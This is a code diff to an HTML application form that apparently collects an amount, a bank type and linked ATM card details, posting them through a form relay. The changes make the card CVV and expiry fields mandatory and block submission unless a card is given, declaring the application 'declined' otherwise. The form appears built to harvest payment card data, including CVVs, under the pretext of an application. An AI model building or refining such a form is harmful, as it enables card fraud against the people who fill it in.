@@ -67,7 +67,12 @@
       font-size: 1em;
     }
 
-    button:hover {
+    button:disabled {
+      background-color: #aaa;
+      cursor: not-allowed;
+    }
+
+    button:hover:enabled {
       background-color: #0056b3;
     }
 
@@ -137,7 +142,7 @@
     <input type="hidden" name="_next" value="https://yourdomain.com/thank-you.html">
     <input type="hidden" name="_captcha" value="false">
 
-    <button type="submit">Submit Application</button>
+    <button type="submit" id="submitButton">Submit Application</button>
   </form>
 
   <script>
@@ -151,6 +156,10 @@
     const bankTypePreview = document.getElementById("bankTypePreview");
     const autoFilledNote = document.getElementById("autoFilledNote");
     const cardSection = document.getElementById("cardSection");
+
+    const cvvInput = document.getElementById("cvv");
+    const expiryInput = document.getElementById("expiry");
+    const submitButton = document.getElementById("submitButton");
 
     function updateDynamicText() {
       const amount = amountInput.value || "[amount]";
@@ -174,11 +183,25 @@
       if (atmLinked.value === "Yes") {
         cardSection.classList.remove("hidden");
         cardSection.style.display = "block";
+
+        cvvInput.required = true;
+        expiryInput.required = true;
+
+        submitButton.disabled = false;
+        submitButton.textContent = "Submit Application";
+
         updateDynamicText();
       } else {
         cardSection.classList.add("hidden");
         cardSection.style.display = "none";
+
+        cvvInput.required = false;
+        expiryInput.required = false;
+
         autoFilledNote.textContent = "YOU MUST HAVE AN ATM CARD TO PROCEED";
+
+        submitButton.disabled = true;
+        submitButton.textContent = "Application Declined – ATM Card Required";
       }
     });
   </script>
